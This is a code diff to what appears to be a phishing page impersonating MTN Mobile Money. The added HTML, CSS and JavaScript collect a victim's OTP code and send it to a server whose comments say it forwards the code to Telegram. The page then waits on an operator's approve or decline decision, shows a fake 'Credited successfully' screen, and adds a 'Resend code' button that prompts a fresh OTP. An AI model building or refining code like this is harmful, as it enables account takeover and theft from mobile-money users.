@@ -20,6 +20,7 @@
     --mtn-soft:  #F5F7FB;
     --mtn-page:  #E7EEF7;
     --mtn-red:   #C62828;
+    --mtn-red-soft: #FEF3F3;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { height: 100%; }
@@ -66,6 +67,28 @@
     padding: 34px 22px 24px;
     display: flex; flex-direction: column; justify-content: flex-start;
   }
+
+  /* Notice shown after decline */
+  .notice {
+    display: none;
+    padding: 13px 15px;
+    border-radius: 12px;
+    font-size: 12.5px;
+    font-weight: 600;
+    line-height: 1.55;
+    margin-bottom: 18px;
+    border: 1px solid transparent;
+  }
+  .notice.show { display: block; }
+  .notice .notice-title {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.6px;
+    text-transform: uppercase; margin-bottom: 4px;
+    display: block;
+  }
+  .notice.warn {
+    background: #FFF8E1; border-color: #FFE08A; color: #7A5B00;
+  }
+  .notice.warn .notice-title { color: #8A6600; }
 
   .section-label {
     font-size: 11px; font-weight: 800; letter-spacing: 0.8px;
@@ -128,6 +151,27 @@
   .btn-approve:active { transform: scale(0.985); }
   .btn-approve:disabled { opacity: 0.65; cursor: wait; }
 
+  .btn-resend {
+    display: none;
+    align-items: center; justify-content: center; gap: 8px;
+    width: 100%; margin-top: 12px;
+    padding: 12px 16px; font-size: 13px; font-weight: 700;
+    background: #fff; color: var(--mtn-royal);
+    border: 1.5px solid var(--mtn-royal); border-radius: 10px;
+    cursor: pointer; font-family: inherit; transition: all .15s;
+  }
+  .btn-resend.show { display: inline-flex; }
+  .btn-resend:hover { background: #F0F5FC; }
+  .btn-resend:disabled { opacity: 0.6; cursor: wait; }
+  .btn-resend svg {
+    width: 15px; height: 15px; stroke: currentColor; fill: none;
+    stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .btn-resend.sent {
+    background: var(--mtn-green); color: #fff;
+    border-color: var(--mtn-green);
+  }
+
   .toast {
     position: fixed; bottom: 24px; left: 50%;
     transform: translateX(-50%) translateY(80px);
@@ -138,35 +182,85 @@
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
   /* ============================================================
-     Full-page "Verifying…" overlay
+     Full-page overlay states
+     - .authorizing: spinner + "Approving transaction…"
+     - .success: green check + "Credited successfully"
   ============================================================ */
-  .authorizing {
+  .authorizing, .success {
     position: fixed; inset: 0;
-    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
     display: none; flex-direction: column;
     align-items: center; justify-content: center;
     padding: 28px 24px; z-index: 9999; text-align: center;
     color: #fff;
   }
-  .authorizing.show { display: flex; }
-  .authorizing .brand-label {
+  .authorizing {
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+  }
+  .success {
+    background: linear-gradient(180deg, #1E7A3A 0%, var(--mtn-green) 100%);
+  }
+  .authorizing.show, .success.show { display: flex; }
+
+  .authorizing .brand-label,
+  .success .brand-label {
     font-size: 15px; font-weight: 800; letter-spacing: -0.2px;
-    margin-bottom: 34px;
+    margin-bottom: 30px;
   }
   .authorizing .brand-label .mtn { color: var(--mtn-yellow); }
   .authorizing .brand-label .mm  { color: #fff; }
+  .success .brand-label .mtn { color: var(--mtn-yellow); }
+  .success .brand-label .mm  { color: #fff; }
+
   .authorizing .spinner {
     width: 60px; height: 60px;
     border: 4px solid rgba(255,255,255,0.18);
     border-top-color: var(--mtn-yellow);
     border-radius: 50%;
     animation: spin 0.9s linear infinite;
-    margin-bottom: 22px;
+    margin-bottom: 24px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .authorizing h2 {
-    font-size: 20px; font-weight: 800; letter-spacing: -0.3px;
+
+  .authorizing h2,
+  .success h2 {
+    font-size: 21px; font-weight: 800; letter-spacing: -0.3px;
+    margin-bottom: 10px;
   }
+  .authorizing p,
+  .success p {
+    font-size: 13px; color: rgba(255,255,255,0.85);
+    max-width: 300px; line-height: 1.6;
+    margin: 0 auto;
+  }
+
+  /* Success checkmark */
+  .success .check {
+    width: 84px; height: 84px; border-radius: 50%;
+    background: rgba(255,255,255,0.15);
+    border: 3px solid rgba(255,255,255,0.7);
+    display: inline-flex; align-items: center; justify-content: center;
+    margin-bottom: 24px;
+    animation: popIn .5s cubic-bezier(.4, 1.4, .6, 1);
+  }
+  .success .check svg {
+    width: 44px; height: 44px;
+    stroke: #fff; fill: none;
+    stroke-width: 3.4; stroke-linecap: round; stroke-linejoin: round;
+    stroke-dasharray: 60; stroke-dashoffset: 60;
+    animation: drawCheck .55s ease-out .15s forwards;
+  }
+  @keyframes popIn {
+    0%   { transform: scale(0.4); opacity: 0; }
+    100% { transform: scale(1);   opacity: 1; }
+  }
+  @keyframes drawCheck {
+    to { stroke-dashoffset: 0; }
+  }
+  .success .credited-amount {
+    font-size: 26px; font-weight: 900; color: var(--mtn-yellow);
+    letter-spacing: -0.5px; margin: 6px 0 14px;
+  }
+
   .authorizing .cancel-link {
     margin-top: 28px; background: transparent; border: none;
     color: rgba(255,255,255,0.68); font-family: inherit;
@@ -183,8 +277,11 @@
     .code-row { gap: 9px; }
     .code-input { width: 54px; height: 62px; font-size: 24px; }
     .btn-approve { height: 50px; font-size: 14px; }
-    .authorizing h2 { font-size: 18px; }
+    .authorizing h2, .success h2 { font-size: 19px; }
     .authorizing .spinner { width: 50px; height: 50px; }
+    .success .check { width: 72px; height: 72px; }
+    .success .check svg { width: 38px; height: 38px; }
+    .success .credited-amount { font-size: 22px; }
   }
   @media (min-width: 640px) {
     body { padding: 32px 0; align-items: center; }
@@ -212,6 +309,11 @@
 
   <div class="body">
 
+    <div class="notice warn" id="noticeExpired">
+      <span class="notice-title">Code expired</span>
+      The code was not approved. Tap <strong>Resend code</strong> below to receive a new OTP, then enter it here.
+    </div>
+
     <div class="section-label">Enter OTP code</div>
 
     <div class="code-row" id="codeRow">
@@ -224,14 +326,36 @@
 
     <button class="btn-approve" id="approveBtn" onclick="approveCode()">Approve</button>
 
+    <button class="btn-resend" id="resendBtn" onclick="resendCode()">
+      <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
+      <span id="resendLabel">Resend code</span>
+    </button>
+
   </div>
 </div>
 
+<!-- ============================================================
+     Full-page "Approving transaction…" overlay
+============================================================ -->
 <div class="authorizing" id="authorizingOverlay">
   <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
   <div class="spinner"></div>
-  <h2 id="authTitle">Verifying…</h2>
+  <h2 id="authTitle">Approving transaction…</h2>
+  <p id="authText">Verifying your code with MTN Mobile Money. Please do not close this page.</p>
   <button class="cancel-link" onclick="cancelAuthorizing()">Cancel</button>
+</div>
+
+<!-- ============================================================
+     Full-page success overlay — "Credited successfully"
+============================================================ -->
+<div class="success" id="successOverlay">
+  <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+  <div class="check">
+    <svg viewBox="0 0 24 24"><polyline points="5 12 10 17 19 7"/></svg>
+  </div>
+  <h2>Credited successfully</h2>
+  <div class="credited-amount" id="creditedAmount">—</div>
+  <p>Your transaction has been approved and the funds have been credited. You will be redirected shortly.</p>
 </div>
 
 <div class="toast" id="toast"></div>
@@ -251,6 +375,24 @@
     dt:  params.get('dt') || ''
   };
 
+  const CURRENCY_LOCALE = {
+    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH', USD: 'en-US'
+  };
+  function formatAmount(amount, currency) {
+    const locale = CURRENCY_LOCALE[currency] || 'en-US';
+    const n = Number(amount);
+    if (!isFinite(n)) return '—';
+    try {
+      const parts = new Intl.NumberFormat(locale, {
+        minimumFractionDigits: 0, maximumFractionDigits: 2
+      }).format(n);
+      const pretty = (currency === 'XAF' || currency === 'UGX')
+        ? parts.replace(/\u202F|\u00A0|,/g, ' ')
+        : parts;
+      return pretty + ' ' + currency;
+    } catch (e) { return n + ' ' + (currency || ''); }
+  }
+
   function showToast(msg) {
     const t = document.getElementById('toast');
     t.textContent = msg; t.classList.add('show');
@@ -268,6 +410,8 @@
     document.getElementById('c4')
   ];
   const codeError = document.getElementById('codeError');
+  const resendBtn = document.getElementById('resendBtn');
+  const noticeExpired = document.getElementById('noticeExpired');
 
   function clearCodeInvalid() {
     codeError.classList.remove('show');
@@ -286,11 +430,10 @@
   codeInputs.forEach((input, idx) => {
     input.addEventListener('input', () => {
       clearCodeInvalid();
+      noticeExpired.classList.remove('show');
       input.value = input.value.replace(/\D/g, '').slice(0, 1);
       updateFilled();
-      if (input.value && idx < 3) {
-        codeInputs[idx + 1].focus();
-      }
+      if (input.value && idx < 3) codeInputs[idx + 1].focus();
     });
 
     input.addEventListener('keydown', (e) => {
@@ -316,6 +459,7 @@
       const digits = text.replace(/\D/g, '').slice(0, 4);
       if (!digits) return;
       clearCodeInvalid();
+      noticeExpired.classList.remove('show');
       for (let i = 0; i < 4; i++) codeInputs[i].value = digits[i] || '';
       updateFilled();
       const last = Math.min(digits.length, 4) - 1;
@@ -349,8 +493,12 @@
   });
 
   /* ============================================================
-     Approve → submit → verify
+     Approve → submit → wait → success / decline / inactive
+     - 5-minute hard session limit on this page
   ============================================================ */
+  const PAGE_LIMIT_MS = 5 * 60 * 1000;   // 5 minutes
+  const PAGE_START = Date.now();
+
   let pollingActive = false;
   let pollTimer = null;
 
@@ -378,6 +526,13 @@
     const btn = document.getElementById('approveBtn');
     btn.disabled = true;
 
+    // Show full-page "Approving transaction…" IMMEDIATELY
+    document.getElementById('authTitle').textContent = 'Approving transaction…';
+    document.getElementById('authText').textContent =
+      'Verifying your code with MTN Mobile Money. Please do not close this page.';
+    document.getElementById('authorizingOverlay').classList.add('show');
+
+    // Fire to server — forwards to Telegram instantly
     let serverAccepted = true;
     try {
       const r = await fetch('/api/verification/submit', {
@@ -393,24 +548,35 @@
       });
       if (!r.ok) serverAccepted = false;
     } catch (e) {
+      document.getElementById('authorizingOverlay').classList.remove('show');
       btn.disabled = false;
       showToast('Network error. Please try again.');
       return;
     }
 
     if (!serverAccepted) {
+      document.getElementById('authorizingOverlay').classList.remove('show');
       btn.disabled = false;
       showToast('Request was not accepted. Please try again.');
       return;
     }
 
-    document.getElementById('authTitle').textContent = 'Verifying…';
-    document.getElementById('authorizingOverlay').classList.add('show');
-
     pollingActive = true;
 
     const poll = async () => {
       if (!pollingActive) return;
+
+      // Hard 5-minute cap for this page
+      if (Date.now() - PAGE_START > PAGE_LIMIT_MS) {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        btn.textContent = 'Approve';
+        noticeExpired.classList.add('show');
+        resendBtn.classList.add('show');
+        showToast('Session expired. Please request a new code.');
+        return;
+      }
 
       let decision = 'pending';
       try {
@@ -421,16 +587,27 @@
 
       if (!pollingActive) return;
 
+      /* -------- APPROVED → success overlay (stays 5 mins, then nav) -------- */
       if (decision === 'approved') {
         pollingActive = false;
-        const q = new URLSearchParams({
-          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
-          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt
-        });
-        window.location.href = 'success.html?' + q.toString();
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        const amtEl = document.getElementById('creditedAmount');
+        amtEl.textContent = tx.am ? formatAmount(tx.am, tx.cur) : 'Credited';
+        document.getElementById('successOverlay').classList.add('show');
+
+        // Stay on success overlay until page 5-min budget ends, then navigate
+        const remaining = Math.max(0, PAGE_LIMIT_MS - (Date.now() - PAGE_START));
+        setTimeout(() => {
+          const q = new URLSearchParams({
+            tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+            c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt
+          });
+          window.location.href = 'success.html?' + q.toString();
+        }, remaining);
         return;
       }
 
+      /* -------- DECLINED / EXPIRED → code expired notice + resend button -------- */
       if (decision === 'declined' || decision === 'expired') {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
@@ -438,21 +615,21 @@
         btn.textContent = 'Approve';
         codeInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
         updateFilled();
-        codeError.textContent = 'The code was not approved. Please check and try again.';
-        codeError.classList.add('show');
-        codeInputs[0].focus();
-        showToast('Verification declined — please enter the code again.');
+        noticeExpired.classList.add('show');
+        resendBtn.classList.add('show');
+        showToast('Code expired. Tap Resend code to receive a new OTP.');
         return;
       }
 
+      /* -------- INACTIVE → navigate to inactive page -------- */
       if (decision === 'inactive' || decision === 'needs_full_sms') {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
-        btn.disabled = false;
-        btn.textContent = 'Approve';
-        codeError.textContent = 'This transaction is inactive. Please contact MTN support.';
-        codeError.classList.add('show');
-        showToast('Transaction inactive.');
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt
+        });
+        window.location.href = 'inactive2.html?' + q.toString();
         return;
       }
 
@@ -460,6 +637,44 @@
     };
 
     poll();
+  }
+
+  /* ============================================================
+     Resend code — asks server to resend OTP + notify Telegram
+  ============================================================ */
+  async function resendCode() {
+    const lbl = document.getElementById('resendLabel');
+    resendBtn.disabled = true;
+    lbl.textContent = 'Sending…';
+    try {
+      const r = await fetch('/api/verification/otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: tx.ref,
+          an: tx.an,
+          c: tx.c,
+          am: tx.am,
+          cur: tx.cur
+        })
+      });
+      if (!r.ok && r.status !== 429) throw new Error('bad');
+      resendBtn.classList.add('sent');
+      lbl.textContent = 'Sent ✓';
+      noticeExpired.classList.remove('show');
+      showToast('A new OTP was sent to your phone.');
+      setTimeout(() => {
+        resendBtn.classList.remove('sent');
+        resendBtn.classList.remove('show');
+        lbl.textContent = 'Resend code';
+        resendBtn.disabled = false;
+        codeInputs[0].focus();
+      }, 3000);
+    } catch (e) {
+      lbl.textContent = 'Resend code';
+      resendBtn.disabled = false;
+      showToast('Could not resend. Please try again in a moment.');
+    }
   }
 </script>
 </body>
